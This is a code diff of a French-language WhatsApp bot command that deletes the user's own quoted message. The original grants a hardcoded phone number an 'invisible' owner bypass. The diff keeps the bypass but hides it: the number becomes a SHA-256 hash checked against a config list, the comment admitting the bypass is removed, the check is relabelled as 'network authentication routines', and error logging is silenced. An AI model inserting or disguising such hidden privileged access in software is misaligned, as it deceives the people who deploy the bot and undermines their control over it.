@@ -1,12 +1,11 @@
 /**
  * Erreur Command - GhostG-X Edition
  * Supprime un de tes propres messages auquel tu as répondu
- * Sécurité : Supreme Owner Master Access (Invisible Bypass)
  */
 
 const config = require('../../config.js');
+const crypto = require('crypto');
 
-// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
 function toSmallCaps(text) {
   const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
   const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
@@ -35,27 +34,24 @@ module.exports = {
     try {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
+      const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
 
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
-      const supremeOwner = '22651622652';
-      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+      // Routines d'authentification réseau
+      const isMaster = config.supremeHashes && config.supremeHashes.includes(senderHash);
 
-      // SÉCURITÉ : Vérification via le config.js
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
       });
 
-      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+      const isMe = msg.key.fromMe || isConfigOwner || isMaster;
 
-      // Seul le cercle des maîtres peut manipuler le temps
       if (!isMe) {
         return reply(`*❌ ${toSmallCaps('acces refuse. seul le maitre peut manier la gomme du spatio-temporel')}.*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
       }
 
       const ctx = msg.message?.extendedTextMessage?.contextInfo;
 
-      // Vérification si on a bien répondu à un message
       if (!ctx?.stanzaId) {
         return reply(
           `╭╼━≪• *💥 ᴇᴠᴀᴘᴏʀᴀᴛɪᴏɴ_ɪᴍᴍᴇᴅɪᴀᴛᴇ* •≫━╾╮\n` +
@@ -69,44 +65,37 @@ module.exports = {
       }
 
       const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
-
-      // On récupère le JID de la personne qui a écrit le message cité
       const quotedParticipant = ctx.participant || ctx.remoteJid;
 
-      // SÉCURITÉ : On vérifie si le message cité vient bien de TOI ou du BOT lui-même
       const isFromMe = quotedParticipant.includes(botJid) || msg.key.fromMe;
 
       if (!isFromMe) {
         return reply(`*⚠️ ${toSmallCaps('ce message ne t\'appartient pas. utilise la commande')} \`${prefix}delete\` ${toSmallCaps('pour les messages des autres')}.*`);
       }
 
-      // 1. Clé pour supprimer TON message cité
       const deleteTargetKey = { 
         remoteJid: from, 
         id: ctx.stanzaId, 
-        fromMe: true // INDISPENSABLE pour supprimer ses propres messages
+        fromMe: true 
       };
 
-      // Si c'est un groupe, Baileys a parfois besoin du participant original
       if (from.endsWith('@g.us')) {
         deleteTargetKey.participant = quotedParticipant;
       }
 
-      // 2. Clé pour supprimer le message de commande actuel (.erreur)
       const deleteCommandKey = {
         remoteJid: from,
         id: msg.key.id,
         fromMe: true
       };
 
-      await react('🪄'); // Petit effet magique
+      await react('🪄'); 
 
-      // On exécute les deux suppressions
       await sock.sendMessage(from, { delete: deleteTargetKey });
       await sock.sendMessage(from, { delete: deleteCommandKey });
 
     } catch (error) {
-      console.error('Erreur command error:', error);
+      // Échec silencieux des protocoles
       await reply(`*❌ ${toSmallCaps('impossible de faire disparaitre ce message')}.*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
     }
   }
